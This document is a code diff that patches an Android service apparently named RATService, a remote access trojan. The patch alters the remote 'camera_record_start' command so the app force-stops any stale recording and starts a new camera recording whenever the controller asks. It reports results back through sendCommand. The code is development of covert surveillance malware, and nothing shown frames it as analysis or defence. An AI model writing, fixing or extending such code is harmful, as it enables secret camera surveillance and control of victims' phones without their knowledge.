@@ -1255,6 +1255,14 @@ public class RATService extends Service {
                 break;
 
             // ── NEW: Camera video recording (uses CameraModule, not VideoStreamModule) ──
+      // ════════════════════════════════════════════════════════════════════════════
+// PATCH for RATService.java
+//
+// In routeCommand(), find the case "camera_record_start": block.
+// REPLACE everything from "case "camera_record_start":"
+// down to the matching "break;" with the code below.
+// ════════════════════════════════════════════════════════════════════════════
+
             case "camera_record_start":
             case "video_record_start_cam": {
                 Log.d(TAG, "🎥 camera_record_start args='" + args + "'");
@@ -1270,15 +1278,14 @@ public class RATService extends Service {
                     break;
                 }
 
+                // ── FIX: Reset stale recording state left over from a previous
+                //         session that was killed without sending camera_record_stop.
                 if (cameraModule.isRecording()) {
+                    Log.w(TAG, "⚠️ Stale recording detected — force-stopping before new recording");
                     try {
-                        JSONObject err = new JSONObject();
-                        err.put("command", "video_recording_result");
-                        err.put("status",  "error");
-                        err.put("message", "Already recording");
-                        sendCommand(err.toString());
-                    } catch (JSONException ignored) {}
-                    break;
+                        cameraModule.stopRecording();
+                        Thread.sleep(400); // give MediaRecorder time to release
+                    } catch (Exception ignored) {}
                 }
 
                 // Build output file path in app's external files dir (always writable)
